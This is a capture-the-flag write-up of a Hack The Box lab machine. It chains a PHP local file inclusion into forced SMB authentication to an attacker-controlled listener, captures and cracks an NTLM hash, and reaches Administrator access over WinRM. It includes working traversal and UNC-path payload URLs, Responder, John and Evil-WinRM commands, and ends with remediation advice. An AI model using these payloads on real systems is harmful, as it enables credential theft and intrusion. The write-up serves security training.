# Write-Up — Unika: LFI to NetNTLMv2 Capture to WinRM Administrator Access

> **Type:** Web Application / Active Directory-adjacent Penetration Test (HTB Starting Point)
> **Target:** `10.129.83.10` (`unika.htb`)
> **Tools:** Nmap, Firefox, Responder, John the Ripper, Evil-WinRM
> **Final Result:** Administrator access via WinRM, obtained by chaining a Local File Inclusion vulnerability into an NTLM hash capture and offline crack

---

## 1. Introduction

The target is a Windows host running an Apache/PHP web server with virtual-host routing, alongside WinRM for remote management. The objective was to enumerate the web application, escalate a file inclusion bug into credential theft, and use the recovered credentials to obtain a remote shell.

This box illustrates a multi-stage chained attack, a step up from single-vulnerability boxes:

- **Virtual hosting misdirection** — the server only serves meaningful content once the correct `Host` header/hostname is used.
- **Local File Inclusion (LFI)** via an unsanitized `page` parameter, confirmed by reading a known Windows system file.
- **NTLM hash theft via forced SMB authentication**, using the same LFI to coerce the server into authenticating to an attacker-controlled listener.
- **Offline hash cracking** of the captured NetNTLMv2 challenge/response.
- **Remote command execution via WinRM**, using the cracked credentials.

---

## 2. Reconnaissance

### 2.1 Connectivity Check

```bash
ping 10.129.83.10
```

Successful replies confirmed the VPN tunnel was up and the target was reachable.

### 2.2 Port Scan — Nmap

```bash
nmap -sV -sC 10.129.83.10
```

Result:

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-title: Unika
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

| Port | Service | Version |
|------|---------|---------|
| 80/tcp | HTTP | Apache 2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1 |
| 5985/tcp | WinRM (HTTPAPI) | Microsoft-HTTPAPI/2.0 |

Two open ports were identified (998 others filtered/no-response). The OS fingerprint confirmed **Windows**, and the pairing of a web server on 80 with **WinRM on 5985** immediately flagged the likely end goal: find credentials for a user with remote management rights, and use them to get a PowerShell shell.

---

## 3. Website Enumeration

### 3.1 Virtual Host Discovery

Browsing directly to `http://10.129.83.10` failed to resolve meaningfully — the browser redirected to `http://unika.htb`, which the attacking host couldn't resolve on its own. This indicated **name-based virtual hosting**: the server inspects the `Host` header and serves content accordingly.

### 3.2 Resolving the Hostname

```bash
echo "10.129.83.10 unika.htb" | sudo tee -a /etc/hosts
```

With the entry added, the browser correctly included `Host: unika.htb` on every request, and the web design business landing page (matching the Nmap `http-title: Unika`) loaded as expected.

### 3.3 Locating the Suspicious Parameter

The site included a language switcher (`EN` / `FR`). Selecting `FR` changed the URL to reference a `page` parameter loading `french.html` — a strong indicator that the backend dynamically includes files based on user-controlled input, a classic **Local/Remote File Inclusion** candidate.

---

## 4. Vulnerability Analysis

### 4.1 Confirming Local File Inclusion

```
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
```

The response returned the contents of `C:\windows\system32\drivers\etc\hosts`, confirming the vulnerability. The `../` sequences traversed back to the filesystem root, bypassing the intended `page=xxx.html` restriction.

### 4.2 Root Cause

- **CVE:** N/A — this is an application-logic input validation flaw
- **Type:** Local File Inclusion (LFI) via unsanitized `include()` usage in PHP
- **Authentication:** None required
- **Impact:** Arbitrary local file read, and (as demonstrated below) forced outbound SMB authentication leading to credential theft

The backend was using PHP's `include()` function to dynamically load a language-specific page based on the `page` parameter, with no validation restricting it to the expected set of files or directory.

### 4.3 Escalating LFI to Credential Theft

Because `allow_url_include` defaults to `Off` in modern PHP, remote HTTP/FTP inclusion was not possible directly. However, PHP does **not** block SMB (`\\host\share`-style) paths from being referenced via `include()`. This meant the server could be coerced into authenticating to an attacker-controlled SMB listener — a well-known technique for capturing **NetNTLMv2** challenge/response material.

---

## 5. Initial Access — Capturing and Cracking Credentials

### 5.1 Setting Up Responder

```bash
sudo responder -I tun0
```

Responder stood up a rogue SMB listener on the attacking host's VPN interface, ready to capture any inbound NTLM authentication attempt.

### 5.2 Triggering Outbound SMB Authentication via LFI

```
http://unika.htb/?page=//10.10.14.25/somefile
```

The browser request returned an error about the file failing to load — expected, since the goal was not to actually include the file, but to force the **web server** to attempt SMB authentication to the attacker's IP in the background.

### 5.3 Capturing the NetNTLMv2 Hash

Responder's console output captured a NetNTLMv2 challenge/response for the **Administrator** account, including the domain, challenge, and encrypted response fields.

### 5.4 Offline Cracking

```bash
echo "Administrator::DESKTOP-H3OF232:...<full NetNTLMv2 string>..." > hash.txt
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```

John the Ripper identified the hash type automatically and successfully cracked the password:

```
password : badminton
```

---

## 6. Foothold — WinRM Access

### 6.1 Connecting with Evil-WinRM

```bash
evil-winrm -i 10.129.83.10 -u administrator -p badminton
```

The connection succeeded, providing an interactive PowerShell session as **Administrator**.

### 6.2 Flag / Evidence

```powershell
type C:\Users\mike\Desktop\flag.txt
```

This returned the lab's flag value, submitted to the Starting Point page to mark the machine as complete.

> **Severity: Critical.** A chained compromise beginning from an unauthenticated web application flaw and ending in full Administrator-level remote command execution — no software CVE was involved at any stage.

---

## 7. Full Attack Chain

```
[ Recon: Nmap ]
       │
       ▼
[ HTTP (80, vhost-routed) + WinRM (5985) on a Windows host ]
       │
       ▼
[ /etc/hosts entry added for unika.htb → landing page loads ]
       │
       ▼
[ Language switcher reveals page= parameter ]
       │
       ▼
[ LFI confirmed via ../ traversal → hosts file read ]
       │
       ▼
[ Responder started on attacker interface ]
       │
       ▼
[ page=//attacker_IP/somefile → server forced to authenticate via SMB ]
       │
       ▼
[ NetNTLMv2 hash captured for Administrator ]
       │
       ▼
[ John the Ripper + rockyou.txt → password cracked: badminton ]
       │
       ▼
[ evil-winrm -u administrator -p badminton → Administrator shell ]
       │
       ▼
[ flag.txt read from mike's Desktop ]
```

**Lesson:** Each individual step here was well-known and simple in isolation — a file-inclusion bug, a hash-capture technique, and a dictionary crack. The real skill was recognizing how to chain a low-severity-looking file read into full domain administrator access.

---

## 8. Remediation Summary

| # | Finding | Severity | Remediation |
|---|---------|----------|--------------|
| 1 | Local File Inclusion via unsanitized `page` parameter | **Critical** | Never pass user input directly into `include()`/`require()`. Use a strict allowlist of valid page identifiers mapped internally to file paths; reject any input containing path traversal sequences or protocol prefixes (`//`, `\\`, `http://`, `smb://`). |
| 2 | PHP `include()` permits SMB-style UNC paths despite `allow_url_include=Off` | **High** | Explicitly validate and restrict the `page` parameter format (e.g., regex-match to a known safe filename pattern) rather than relying solely on `php.ini` settings, which do not cover this vector. |
| 3 | Outbound SMB authentication not restricted at the network/host firewall level | **High** | Block outbound SMB (445/tcp) from web-facing servers to arbitrary external hosts; this prevents NTLM relay/capture attacks even if an LFI-style bug exists. |
| 4 | Administrator password crackable against a common wordlist (`rockyou.txt`) | **Critical** | Enforce strong, non-dictionary passwords for all privileged accounts; consider disabling NTLM authentication in favor of Kerberos-only where feasible, and enable SMB signing to mitigate relay/capture value. |
| 5 | WinRM directly reachable and usable with password authentication | **Medium** | Restrict WinRM access to management network segments; prefer certificate-based or Kerberos authentication over password auth for remote management. |

---

## 9. Conclusion

This box is a compact illustration of a principle that shows up constantly in real-world Windows environments:

1. **Low-severity-looking bugs can be force-multiplied.** An LFI that "only" reads local files became a full domain compromise once combined with NTLM's willingness to authenticate to anything that looks like an SMB share.
2. **NTLM's design is inherently attacker-friendly once an outbound connection can be triggered.** Any functionality that lets a server reach out to an arbitrary path — file inclusion, SSRF, document parsers — is a potential NTLM capture vector if outbound SMB isn't restricted.

The fix is layered: sanitize the input that starts the chain, but also assume it won't always be caught, and block the network behavior (outbound SMB) that makes the follow-on attack possible at all.
